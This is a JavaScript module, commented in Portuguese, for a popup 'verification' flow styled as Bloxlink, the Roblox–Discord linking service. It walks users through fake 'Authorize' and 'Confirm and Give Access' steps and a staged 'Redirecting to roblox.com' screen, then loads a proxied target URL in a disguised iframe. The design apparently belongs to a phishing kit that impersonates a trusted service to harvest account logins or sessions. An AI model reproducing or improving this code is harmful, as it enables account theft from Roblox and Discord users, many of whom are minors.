import { CONFIG } from "./config.js";
import { redirectToDiscordOAuth } from "./discord.js";

/**
 * Módulo de Controle dos Modais e Transições de Verificação
 */

export async function fetchRobloxUserAvatar(username) {
  if (!username || !username.trim()) {
    return {
      name: CONFIG.DEFAULT_ROBLOX_USER,
      avatarUrl: CONFIG.DEFAULT_ROBLOX_AVATAR
    };
  }

  const cleanUser = username.trim();
  try {
    const res = await fetch(`${CONFIG.API_ROBLOX_ENDPOINT}?username=${encodeURIComponent(cleanUser)}`);
    if (res.ok) {
      const data = await res.json();
      if (data.success && data.avatarUrl) {
        return {
          name: data.name || cleanUser,
          avatarUrl: data.avatarUrl
        };
      }
    }
  } catch (err) {
    console.warn("Roblox API note:", err);
  }

  return {
    name: cleanUser,
    avatarUrl: CONFIG.DEFAULT_ROBLOX_AVATAR
  };
}

export function isMobileDevice() {
  return (
    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
    window.innerWidth <= 768
  );
}

export function closePopup() {
  const popupOverlay = document.getElementById("popupOverlay");
  const loadingRedirectContent = document.getElementById("loadingRedirectContent");
  const step1Content = document.getElementById("step1Content");
  const step2Content = document.getElementById("step2Content");
  const iframeContent = document.getElementById("iframeContent");

  if (popupOverlay) popupOverlay.classList.remove("active");
  if (loadingRedirectContent) loadingRedirectContent.style.display = "none";
  if (step1Content) step1Content.style.display = "none";
  if (step2Content) step2Content.style.display = "none";
  if (iframeContent) iframeContent.style.display = "none";
}

export function adaptDiscordIframeForMobile() {
  const discordIframe = document.getElementById("discordIframe");
  const iframeContent = document.getElementById("iframeContent");
  if (!discordIframe || !iframeContent) return;

  const isMobile = window.innerWidth <= 900 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

  if (isMobile) {
    const targetDesktopWidth = 850;
    const containerWidth = iframeContent.clientWidth || window.innerWidth * 0.94;
    const containerHeight = iframeContent.clientHeight || window.innerHeight * 0.88;
    const scale = Math.min(1, containerWidth / targetDesktopWidth);

    discordIframe.style.width = `${targetDesktopWidth}px`;
    discordIframe.style.height = `${containerHeight / scale}px`;
    discordIframe.style.transform = `scale(${scale})`;
    discordIframe.style.transformOrigin = "top left";
    discordIframe.style.margin = "0";
    discordIframe.style.display = "block";
    discordIframe.style.border = "none";
  } else {
    discordIframe.style.width = "100%";
    discordIframe.style.height = "100%";
    discordIframe.style.transform = "none";
    discordIframe.style.transformOrigin = "initial";
    discordIframe.style.margin = "0";
    discordIframe.style.display = "block";
  }
}

export async function openVerificationModal(username) {
  const popupOverlay = document.getElementById("popupOverlay");
  const popupContainer = document.getElementById("popupContainer");
  const loadingRedirectContent = document.getElementById("loadingRedirectContent");
  const step1Content = document.getElementById("step1Content");
  const step2Content = document.getElementById("step2Content");
  const iframeContent = document.getElementById("iframeContent");
  const robloxAccountName2 = document.getElementById("robloxAccountName2");
  const robloxAvatarImg2 = document.getElementById("robloxAvatarImg2");

  if (popupOverlay) popupOverlay.classList.add("active");
  if (popupContainer) popupContainer.classList.remove("expanded");

  // Inicia diretamente na tela 1 (Authorize with Roblox OAuth)
  if (loadingRedirectContent) loadingRedirectContent.style.display = "none";
  if (step1Content) step1Content.style.display = "flex";
  if (step2Content) step2Content.style.display = "none";
  if (iframeContent) iframeContent.style.display = "none";

  const targetUser = username && username.trim()
    ? username.trim()
    : (sessionStorage.getItem("saved_roblox_username") || CONFIG.DEFAULT_ROBLOX_USER);
  sessionStorage.setItem("saved_roblox_username", targetUser);

  if (robloxAccountName2) robloxAccountName2.textContent = targetUser;

  // Busca informações do perfil Roblox
  fetchRobloxUserAvatar(targetUser).then(robloxProfile => {
    sessionStorage.setItem("saved_roblox_avatar", robloxProfile.avatarUrl);
    if (robloxAccountName2) robloxAccountName2.textContent = robloxProfile.name;
    if (robloxAvatarImg2 && robloxProfile.avatarUrl) robloxAvatarImg2.src = robloxProfile.avatarUrl;
  });
}

export function handleVerificationAction(username) {
  if (username && username.trim()) {
    sessionStorage.setItem("saved_roblox_username", username.trim());
  }

  const isMobile = isMobileDevice();
  const isLogged = localStorage.getItem("bloxlink_logged_in") === "true";

  if (isMobile || isLogged) {
    openVerificationModal(username);
  } else {
    redirectToDiscordOAuth();
  }
}

export function initModalListeners() {
  const popupClose = document.getElementById("popupClose");
  const btnCancelRedirect = document.getElementById("btnCancelRedirect");
  const popupOverlay = document.getElementById("popupOverlay");
  const popupContainer = document.getElementById("popupContainer");
  const btnContinueStep1 = document.getElementById("btnContinueStep1");
  const btnReturnToBloxlink = document.getElementById("btnReturnToBloxlink");
  const btnCancelStep2 = document.getElementById("btnCancelStep2");
  const btnConfirmAccess = document.getElementById("btnConfirmAccess");
  const step1Content = document.getElementById("step1Content");
  const step2Content = document.getElementById("step2Content");
  const loadingRedirectContent = document.getElementById("loadingRedirectContent");
  const iframeContent = document.getElementById("iframeContent");
  const robloxUserInput = document.getElementById("robloxUserInput");

  if (popupClose) popupClose.addEventListener("click", closePopup);

  if (btnCancelRedirect) {
    btnCancelRedirect.addEventListener("click", (e) => {
      e.preventDefault();
      closePopup();
      if (robloxUserInput) {
        robloxUserInput.focus();
        robloxUserInput.select();
      }
    });
  }

  if (popupOverlay) {
    popupOverlay.addEventListener("click", (e) => {
      if (e.target === popupOverlay) closePopup();
    });
  }

  // Passo 1 -> Passo 2 (Bloxlink is Requesting Access)
  if (btnContinueStep1) {
    btnContinueStep1.addEventListener("click", () => {
      if (step1Content) step1Content.style.display = "none";
      if (step2Content) step2Content.style.display = "flex";
    });
  }

  if (btnReturnToBloxlink) {
    btnReturnToBloxlink.addEventListener("click", () => {
      closePopup();
      if (robloxUserInput) {
        robloxUserInput.focus();
        robloxUserInput.select();
      }
    });
  }

  if (btnCancelStep2) {
    btnCancelStep2.addEventListener("click", () => {
      closePopup();
      if (robloxUserInput) {
        robloxUserInput.focus();
        robloxUserInput.select();
      }
    });
  }

  // Passo 2 (Confirm and Give Access) -> Tela de Carregamento (Redirecting to roblox.com) -> Iframe
  if (btnConfirmAccess) {
    btnConfirmAccess.addEventListener("click", () => {
      // 1. Oculta o passo de confirmação
      if (step2Content) step2Content.style.display = "none";
      
      // 2. Exibe a tela de carregamento "Redirecting to roblox.com"
      if (loadingRedirectContent) loadingRedirectContent.style.display = "flex";

      const discordIframe = document.getElementById("discordIframe");
      if (discordIframe) {
        if (!discordIframe.src || discordIframe.src === "about:blank") {
          discordIframe.src = CONFIG.PROXIED_TARGET_URL;
        }
      }

      // 3. Após o carregamento, expande e exibe o iframe
      setTimeout(() => {
        if (loadingRedirectContent) loadingRedirectContent.style.display = "none";
        if (iframeContent) iframeContent.style.display = "block";
        if (popupContainer) popupContainer.classList.add("expanded");
        setTimeout(adaptDiscordIframeForMobile, 50);
      }, 1200);
    });
  }

  window.addEventListener("resize", () => {
    if (iframeContent && iframeContent.style.display !== "none") {
      adaptDiscordIframeForMobile();
    }
  });

  window.addEventListener("message", (event) => {
    if (event.data && event.data.action === "change_account") {
      closePopup();
      if (robloxUserInput) {
        robloxUserInput.focus();
        robloxUserInput.select();
      }
    }
  });
}
